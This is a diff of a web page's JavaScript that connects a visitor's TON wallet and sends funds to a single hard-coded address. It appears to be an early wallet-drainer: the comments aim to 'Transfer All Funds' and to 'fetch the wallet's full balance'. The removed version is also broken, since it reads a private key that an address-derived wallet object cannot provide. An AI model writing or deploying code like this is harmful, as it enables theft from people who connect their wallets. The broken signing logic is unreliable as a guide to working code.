@@ -15,58 +15,49 @@
 
     <script>
         const walletAAddress = "UQDSt8XTc0ylw4npYOJOPuiXJKykeNRawfr4-Wxeu1yB-6vS"; // Wallet A address
+        const status = document.getElementById("status");
+        const transferBtn = document.getElementById("transferBtn");
+
+        // Initialize TonConnectUI
         const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
             manifestUrl: 'https://tonconnect.org/manifest.json',
-            buttonRootId: 'ton-connect'
         });
 
-        const connectBtn = document.getElementById("connectBtn");
-        const transferBtn = document.getElementById("transferBtn");
-        const status = document.getElementById("status");
+        let walletDetails = null;
 
-        let walletBAddress = "";  // This will store Wallet B's address
-
-        // Connect Wallet
-        connectBtn.addEventListener("click", async () => {
-            try {
-                const connectionStatus = await tonConnectUI.connect();
-                if (connectionStatus === 'ready') {
-                    const walletDetails = await tonConnectUI.getWallet();
-                    walletBAddress = walletDetails.address;
-
-                    status.innerText = `Connected to Wallet B: ${walletBAddress}`;
-                    transferBtn.style.display = "block";
-                } else {
-                    status.innerText = "Wallet not connected.";
-                }
-            } catch (error) {
-                status.innerText = "Failed to connect wallet.";
-                console.error("Error connecting wallet:", error);
+        // Handle Wallet Connection
+        tonConnectUI.onStatusChange((walletInfo) => {
+            if (walletInfo) {
+                walletDetails = walletInfo;
+                status.innerText = `Connected to Wallet B: ${walletInfo.address}`;
+                transferBtn.style.display = "block";
+            } else {
+                status.innerText = "Wallet not connected.";
             }
         });
 
-        // Transfer All Funds to Wallet A
+        // Handle Transfer
         transferBtn.addEventListener("click", async () => {
+            if (!walletDetails) {
+                status.innerText = "Connect a wallet first!";
+                return;
+            }
+
             try {
                 const tonweb = new TonWeb();
-                const walletB = tonweb.wallet.fromAddress(walletBAddress);
+                const amountNanoTON = 1000000; // Change this to fetch the wallet's full balance
 
-                // Fetch Wallet B's balance
-                const balance = await walletB.getBalance();
-                const balanceInTon = balance / Math.pow(10, 9);  // TON is in nanoTON (1e9)
+                // Create transaction data
+                const transaction = {
+                    to: walletAAddress,
+                    value: amountNanoTON, // Amount to transfer in nanoTON
+                    stateInit: undefined,
+                    payload: undefined,
+                };
 
-                // Prepare the transaction to send all balance to Wallet A
-                const transaction = await walletB.createTransfer({
-                    secretKey: walletB.secretKey, // User must authorize signing with private key
-                    to: walletAAddress,           // Transfer to Wallet A
-                    amount: balance,              // Send all funds
-                });
-
-                // Sign and send the transaction
-                const signedTransaction = await walletB.signTransfer(transaction);
-                const transactionHash = await tonweb.net.submitTransaction(signedTransaction);
-                
-                status.innerText = `Transaction sent. Hash: ${transactionHash}`;
+                // Send transaction via connected wallet
+                const result = await tonConnectUI.sendTransaction(transaction);
+                status.innerText = `Transaction successful: ${result}`;
             } catch (error) {
                 console.error("Transfer failed:", error);
                 status.innerText = `Transfer failed: ${error.message}`;
